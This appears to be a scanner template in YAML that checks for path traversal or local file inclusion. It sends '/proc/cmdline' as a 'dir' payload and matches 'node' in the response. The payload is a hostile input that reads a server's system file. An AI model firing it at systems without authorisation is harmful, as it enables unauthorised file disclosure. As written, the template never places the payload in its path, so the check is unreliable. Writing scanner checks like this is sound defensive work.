id: lfi6-0639
name: 'Traversal in dir'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via dir'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      dir:
        - '/proc/cmdline'
    matchers:
      - type: word
        part: body
        words:
          - 'node'
